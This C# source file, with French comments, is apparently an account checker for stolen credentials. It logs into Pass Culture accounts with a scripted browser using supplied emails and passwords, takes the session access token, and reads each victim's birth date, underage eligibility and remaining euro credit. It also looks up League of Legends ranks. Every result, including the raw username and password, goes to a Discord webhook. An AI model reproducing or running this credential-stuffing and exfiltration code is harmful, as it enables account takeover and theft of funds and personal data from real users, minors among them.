using System;
using System.Net;
using System.IO;
using System.Threading.Tasks;
using Newtonsoft.Json;
using PuppeteerSharp;
using Org.BouncyCastle.Crypto;
using RiotSharp;
using RiotSharp.Misc;
using Newtonsoft.Json.Linq;
using System.IO.Compression;
using System.Net.Http.Headers;
using System.Text;

namespace AuthServer.DataVortex
{
    internal class Checker
    {
        // Déclarez des variables publiques statiques pour stocker les informations de vérification
        public static bool IsVerified;
        public static string BirthDate;
        public static double? RemainingCredit;
        public static string Eligibility;
        public static double? RemainingCreditInEuros;

        public static void HandleAccount(string keyword, (string url, string username, string password, string app) account, string webhookUrl, string fileName)
        {
            bool keywordHandled = true;

            switch (keyword)
            {
                case "passculture":
                    CheckPassCulture(account, webhookUrl, fileName).Wait();
                    break;
                case "leagueoflegends":
                    CheckLeagueOfLegends(account, webhookUrl, fileName).Wait();
                    break;
                default:
                    keywordHandled = false;
                    break;
            }

            if (!keywordHandled)
            {
                // Envoyer un embed indiquant que le mot-clé n'a pas été trouvé
                var results = new List<(string url, string username, string password, string app)> { account };
                WebHook.Send.SendToDiscordWebhookNoChecker(results, webhookUrl, fileName, keyword).Wait();
            }
        }

        public static async Task CheckLeagueOfLegends((string url, string username, string password, string app) account, string webhookUrl, string fileName)
        {
            string baseUrl = "https://www.op.gg/_next/data/9Dl9jKceoVImcVs6CRUvr/en_US/summoners/euw";
            string region = "euw";
            string summoner = account.username;

            // Construire l'URL complète avec les paramètres de requête
            string url = $"{baseUrl}/{summoner}-EUW.json";
            Console.WriteLine(url);
            Console.WriteLine(baseUrl);

            // Créer une instance de HttpClient
            using (HttpClient client = new HttpClient())
            {
                // Ajouter les en-têtes nécessaires
                client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("*/*"));
                client.DefaultRequestHeaders.AcceptEncoding.Add(new StringWithQualityHeaderValue("gzip"));
                client.DefaultRequestHeaders.AcceptEncoding.Add(new StringWithQualityHeaderValue("deflate"));
                client.DefaultRequestHeaders.AcceptEncoding.Add(new StringWithQualityHeaderValue("br"));
                client.DefaultRequestHeaders.AcceptLanguage.Add(new StringWithQualityHeaderValue("fr"));
                client.DefaultRequestHeaders.AcceptLanguage.Add(new StringWithQualityHeaderValue("fr-FR", 0.9));
                client.DefaultRequestHeaders.AcceptLanguage.Add(new StringWithQualityHeaderValue("en", 0.8));
                client.DefaultRequestHeaders.AcceptLanguage.Add(new StringWithQualityHeaderValue("en-GB", 0.7));
                client.DefaultRequestHeaders.AcceptLanguage.Add(new StringWithQualityHeaderValue("en-US", 0.6));
                client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0");
                client.DefaultRequestHeaders.Add("sec-ch-ua", "\"Not)A;Brand\";v=\"99\", \"Microsoft Edge\";v=\"127\", \"Chromium\";v=\"127\"");
                client.DefaultRequestHeaders.Add("sec-ch-ua-mobile", "?0");
                client.DefaultRequestHeaders.Add("sec-ch-ua-platform", "\"Windows\"");
                client.DefaultRequestHeaders.Add("sec-fetch-dest", "empty");
                client.DefaultRequestHeaders.Add("sec-fetch-mode", "cors");
                client.DefaultRequestHeaders.Add("sec-fetch-site", "same-origin");
                client.DefaultRequestHeaders.Add("x-nextjs-data", "1");

                try
                {
                    // Faire la requête GET
                    HttpResponseMessage response = await client.GetAsync(url);

                    // Vérifier si la requête a réussi
                    response.EnsureSuccessStatusCode();

                    // Lire le contenu de la réponse avec l'encodage Brotli
                    using (var responseStream = await response.Content.ReadAsStreamAsync())
                    using (var decompressedStream = new BrotliStream(responseStream, CompressionMode.Decompress))
                    using (var reader = new StreamReader(decompressedStream, Encoding.UTF8))
                    {
                        string responseBody = await reader.ReadToEndAsync();

                        // Désérialiser la réponse JSON
                        var jsonResponse = JObject.Parse(responseBody);

                        // Extraire la section pageProps
                        var pageProps = jsonResponse.SelectToken("pageProps");

                        // Vérifier si pageProps est null
                        if (pageProps != null)
                        {
                            // Extraire la section data de pageProps
                            var data = pageProps.SelectToken("data");

                            // Vérifier si data est null
                            if (data != null)
                            {
                                // Extraire le niveau (level)
                                var level = data.SelectToken("level");
                                Console.WriteLine($"Level: {level}");

                                // Extraire la section league_stats
                                var leagueStats = data.SelectToken("league_stats");

                                // Vérifier si league_stats est null
                                if (leagueStats != null)
                                {
                                    // Extraire les statistiques pour SOLORANKED
                                    var soloRankedStats = leagueStats.FirstOrDefault(stat => stat["game_type"].ToString() == "SOLORANKED");

                                    // Vérifier si soloRankedStats est null
                                    if (soloRankedStats != null)
                                    {
                                        // Extraire et afficher tier et lp
                                        var tier = soloRankedStats.SelectToken("tier_info.tier");
                                        var lp = soloRankedStats.SelectToken("tier_info.lp");
                                        Console.WriteLine($"Tier: {tier}");
                                        Console.WriteLine($"LP: {lp}");

                                        await WebHook.Send.SendToDiscordWebhookLeagueOfLegends(new List<(string url, string username, string password, string app)> { account }, fileName, account.username, level.ToString(), tier.ToString(), lp.ToString(), webhookUrl);
                                    }
                                    else
                                    {
                                        Console.WriteLine("Les statistiques pour SOLORANKED n'ont pas été trouvées dans league_stats.");
                                        await WebHook.Send.SendToDiscordWebhookLeagueOfLegendsNonVerified(new List<(string url, string username, string password, string app)> { account }, webhookUrl, fileName);
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("La section league_stats n'a pas été trouvée dans data.");
                                    await WebHook.Send.SendToDiscordWebhookLeagueOfLegendsNonVerified(new List<(string url, string username, string password, string app)> { account }, webhookUrl, fileName);
                                }
                            }
                            else
                            {
                                Console.WriteLine("La section data n'a pas été trouvée dans pageProps.");
                                await WebHook.Send.SendToDiscordWebhookLeagueOfLegendsNonVerified(new List<(string url, string username, string password, string app)> { account }, webhookUrl, fileName);
                            }
                        }
                        else
                        {
                            Console.WriteLine("La section pageProps n'a pas été trouvée dans la réponse JSON.");
                            await WebHook.Send.SendToDiscordWebhookLeagueOfLegendsNonVerified(new List<(string url, string username, string password, string app)> { account }, webhookUrl, fileName);
                        }
                    }
                }
                catch (HttpRequestException e)
                {
                    // Afficher les détails de l'erreur
                    Console.WriteLine($"Erreur lors de la requête : {e.Message}");
                }
            }
        }

        public static async Task CheckPassCulture((string url, string username, string password, string app) account, string webhookUrl, string fileName)
        {
            Console.WriteLine("aa");
            int maxAttempts = 5;
            int attempts = 0;
            bool success = false;

            while (attempts < maxAttempts && !success)
            {
                attempts++;

                // Configuration de Puppeteer pour utiliser Chromium
                var launchOptions = new LaunchOptions
                {
                    Headless = false, // Vous pouvez modifier cette option selon vos besoins
                    ExecutablePath = "", // Chemin vers l'exécutable Chromium
                };

                // Lancement du navigateur Chromium
                using (var browser = await Puppeteer.LaunchAsync(launchOptions))
                {
                    // Création d'une nouvelle page
                    using (var page = await browser.NewPageAsync())
                    {
                        // Modifier l'en-tête User-Agent pour imiter un navigateur ordinaire
                        await page.SetUserAgentAsync("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36");

                        // Chargement de la page de connexion
                        await page.GoToAsync("https://passculture.app/connexion");

                        // Attendre que la fenêtre contextuelle apparaisse
                        await page.WaitForSelectorAsync("[data-testid='modalContainer']");

                        await Task.Delay(5000);

                        // Cliquer sur le bouton "Tout refuser" dans la fenêtre contextuelle
                        await page.ClickAsync("[data-testid='Tout refuser']");

                        // Attendre un court instant pour laisser le temps à la page de réagir
                        await Task.Delay(5000);

                        // Insertion des valeurs dans les champs email et mot de passe
                        await page.TypeAsync("input[type='email']", account.username);
                        await page.TypeAsync("input[type='password']", account.password);

                        // Clique sur le bouton "Se connecter"
                        var loginButton = await page.QuerySelectorAsync("button[data-testid='Se connecter']");
                        await loginButton.ClickAsync();

                        // Attendre 5 secondes après avoir cliqué sur le bouton "Se connecter"
                        await Task.Delay(5000);

                        // Exécutez du code JavaScript pour récupérer l'access token du Local Storage
                        var accessToken = await page.EvaluateFunctionAsync<string>(@"
                () => {
                    return localStorage.getItem('access_token');
                }"
                        );

                        // Afficher l'access token
                        Console.WriteLine($"Access Token: {accessToken}");

                        if (!string.IsNullOrEmpty(accessToken))
                        {
                            // Effectuer une requête avec l'access token
                            var url = "https://backend.passculture.app/native/v1/me";
                            var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                            httpRequest.Headers["Authorization"] = "Bearer " + accessToken;

                            try
                            {
                                var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                                {
                                    var result = streamReader.ReadToEnd();

                                    // Parsez le résultat en un objet JSON
                                    var data = JsonConvert.DeserializeObject<dynamic>(result);

                                    // Récupérez la date de naissance et le crédit de domaine
                                    BirthDate = data.birthDate;
                                    RemainingCredit = data.domainsCredit.all.remaining;
                                    Eligibility = data.eligibility;

                                    // Convertissez le crédit restant en euros
                                    RemainingCreditInEuros = RemainingCredit / 100.0;

                                    // Affichez uniquement ces valeurs
                                    Console.WriteLine($"Date of Birth: {BirthDate}");
                                    Console.WriteLine($"Remaining domain credit: {RemainingCreditInEuros}€");
                                    Console.WriteLine($"Éligibilité: {Eligibility}");

                                    // Mettez à jour IsVerified
                                    IsVerified = true;
                                    success = true;
                                }
                            }
                            catch (WebException ex)
                            {
                                Console.WriteLine($"Erreur lors de la requête: {ex.Message}");

                                // Si la vérification a échoué, mettez à jour IsVerified
                                IsVerified = false;
                            }
                        }
                        else
                        {
                            // Si la vérification a échoué, mettez à jour IsVerified
                            IsVerified = false;
                        }
                    }
                }
            }

            // Placer le code ici
            var results = new List<(string url, string username, string password, string app)> { account };
            if (DataVortex.Checker.IsVerified)
            {
                bool isUnderage = Eligibility == "underage";
                await WebHook.Send.SendToDiscordWebhookPassCulture(results, webhookUrl, fileName, isUnderage, RemainingCreditInEuros);
            }
            else
            {
                // Envoyer le compte non vérifié avec une ligne supplémentaire dans l'embed
                WebHook.Send.SendToDiscordWebhookPassCultureNonVerified(results, webhookUrl, fileName).Wait();
            }
        }
    }
}
